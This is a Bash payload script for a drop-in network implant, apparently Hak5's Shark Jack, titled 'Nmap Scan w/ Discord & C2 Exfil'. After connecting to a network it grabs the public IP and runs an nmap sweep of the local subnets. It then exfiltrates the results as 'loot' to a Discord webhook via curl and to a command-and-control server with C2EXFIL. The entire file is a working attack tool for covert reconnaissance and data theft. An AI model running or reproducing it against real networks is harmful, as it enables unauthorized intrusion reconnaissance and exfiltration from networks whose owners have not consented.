#!/bin/bash
##############
## Metadata ##
##############
#
# Title:          Nmap Scan w/ Discord & C2 Exfil
# Author:         Josh Buker
# Version:        1.0.0
# Description:    Based on REDD of Private-Locker's Nmap Scan Payload.
#
#######################
## Stage Indicators: ##
#######################
#
# Magenta....................Booting into DHCP Client Mode
# Magenta w/ Yellow..........Waiting for Ethernet Connection
# Magenta w/ Cyan............Waiting for Internet Connection
# Magenta w/ White...........Waiting for Gateway IP
# Yellow (Single Blink)......Starting Attack
# Yellow (Double Blink)......Grabbing Public IP
# Yellow (Rapid Blinking)....Running Nmap Scan
# Yellow (Solid).............Nmap Scan Complete, beginning Loot Exfiltration
# Cyan (Fast Blink)..........Sending Loot to Discord
# Cyan (Solid)...............Loot Exfiltrated to Discord
# Blue (Slow Blink)..........Establishing C2 Connection
# Blue (Fast Blink)..........C2 Connection Established, Verifying Connection
# Blue (Very Fast Blink).....Sending Loot to C2
# Blue (Solid)...............Loot Exfiltrated to C2
#
# Green......................Payload Complete (Success)
# Red (Slow Blink)...........Payload Aborted (Nmap Scan Failed)
#
###################
## Configuration ##
###################

# Turn on Discord Integration (Yes = 1, No = 0)
DISCORD=0
# Discord Webhook URL
WEBHOOK="copy_paste_your_webhook_here"

# URL to check for Internet Connection
URL="http://example.com"
# Send Loot as File or Plain Messages (File = 1, Messages = 0)
AS_FILE=1

# Check if C2 is enabled
if [ -f "/etc/device.config" ]; then
    INITIALIZED=1
else
    INITIALIZED=0
fi

#############
## PAYLOAD ##
#############

LED SETUP
SERIAL_WRITE "[*] Booting into DHCP Client Mode"
NETMODE DHCP_CLIENT

SERIAL_WRITE "[*] Waiting for Ethernet Connection"
while ! ifconfig eth0 | grep "inet addr"; do LED Y SOLID; sleep .2; LED M SOLID; sleep .8; done

SERIAL_WRITE "[*] Waiting for Internet Connection"
while ! wget $URL -qO /dev/null; do LED C SOLID; sleep .2; LED M SOLID; sleep .8; done

SERIAL_WRITE "[*] Waiting for Gateway IP"
GATEWAY_IP=$(route -n | grep 'UG[ \t]' | awk '{print $2}')
while [ $GATEWAY_IP == "" ]; do LED W SOLID; sleep .2; LED M SOLID; sleep .8; done

LED ATTACK
SERIAL_WRITE "[*] Starting Attack"

INTERNAL_IP=$(ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*).*/\2/p')
GATEWAY_SUBNET=$(echo "$GATEWAY_IP" | awk -F"." '{print $1"."$2"."$3".0/24"}')
CHK_SUB=$(echo $INTERNAL_IP | cut -d"." -f1-3)
INTERNAL_SUBNET="${CHK_SUB}.0/24"
SCAN_SUBNET="${GATEWAY_SUBNET}"

# If the gateway subnet is different from internal IP subnet, scan both
if [ "$GATEWAY_SUBNET" != "$INTERNAL_SUBNET" ]; then
    SCAN_SUBNET="${GATEWAY_SUBNET} ${INTERNAL_SUBNET}"
fi

# Fix for Timestamp Update
ntpd -gq; sleep 1;
DATE_FORMAT=$(date '+%m-%d-%Y_%H:%M:%S')
LOOT_DIR="/root/loot/nmap-scan"
LOOT_FILE="$LOOT_DIR/nmap-results-${DATE_FORMAT}.txt"

# Initialize Loot Directory
if [ ! -d "$LOOT_DIR" ]; then
    mkdir -p "$LOOT_DIR"
fi

# Initialize Loot File
if [ ! -f "$LOOT_FILE" ]; then
    touch "$LOOT_FILE"
fi

LED STAGE2
SERIAL_WRITE "[*] Grabbing Public IP"

PUBLIC_IP=$(wget -q "http://api.ipify.org" -O -)
printf "\n       Public IP: ${PUBLIC_IP}\n    Online Devices for ${SCAN_SUBNET}:\n--------------------------------------------\n\n" >> "$LOOT_FILE"

# LED STAGE3
# SERIAL_WRITE "[*] Installing CURL"
# CURL_CHK=$(which curl)
# if [ "$CURL_CHK" != "/usr/bin/curl" ]; then
#     opkg update; opkg install libcurl curl;
# fi

LED Y VERYFAST
SERIAL_WRITE "[*] Running Nmap Scan"

run_nmap () {
    nmap -sn --privileged ${SCAN_SUBNET} --exclude "$INTERNAL_IP" | awk '/Nmap scan report for/{printf " -> ";printf $5;}/MAC Address:/{print " - "substr($0, index($0,$3)) }' >> "$LOOT_FILE"
}
run_nmap &
PID=$!
    while kill -0 "$PID" 2>&1 >/dev/null; do
        wait $PID
    done

if [ -s "$LOOT_FILE" ]; then
    SERIAL_WRITE "[*] Nmap Scan Complete, beginning Loot Exfiltration"
    LED Y SOLID; sleep 1
    # Send Loot to Discord Webhook
    if [ "$DISCORD" == 1 ]; then
        LED C FAST
        SERIAL_WRITE "[*] Sending Loot to Discord"
        if [ "$AS_FILE" == 1 ]; then
            FILE=\"$LOOT_FILE\"
            curl -s -i -H 'Content-Type: multipart/form-data' -F FILE=@$FILE -F 'payload_json={ "wait": true, "content": "Loot has arrived!", "username": "SharkJack" }' -o "$CURL_RESULTS" "$WEBHOOK"
        fi
        if [ "$AS_FILE" == 0 ]; then
            while read -r line; do
                DISCORD_MSG=\"**$line**\"
                curl -H "Content-Type: application/json" -X POST -d "{\"content\": $DISCORD_MSG}" -o "$CURL_RESULTS" "$WEBHOOK"
            done < "$LOOT_FILE"
        fi
        SERIAL_WRITE "[*] Loot Exfiltrated to Discord"
        LED C SUCCESS; sleep 2
    fi
    # Exfiltrate to C2 if enabled
    if [ "$INITIALIZED" == 1 ]; then
        LED B SLOW
        SERIAL_WRITE "[*] Establishing C2 Connection"
        if [ -z "$(pgrep cc-client)" ]; then
            C2CONNECT
            while ! pgrep cc-client; do sleep 1; done
        fi
        LED B FAST
        SERIAL_WRITE "[*] C2 Connection Established, Verifying Connection"
        # Re-issuing C2CONNECT to verify loot push to C2
        C2CONNECT
        sleep 2
        LED B VERYFAST
        SERIAL_WRITE "[*] Sending Loot to C2"
        C2EXFIL STRING "${LOOT_FILE}" "Nmap Diagnostic for Network ${SCAN_SUBNET}"
        LED B SUCCESS; sleep 2
    fi
    LED FINISH;
    if [ "$INITIALIZED" == 1 ]; then
        C2DISCONNECT
    fi
else
    LED FAIL1;
    rm -rf "$LOOT_FILE";
fi
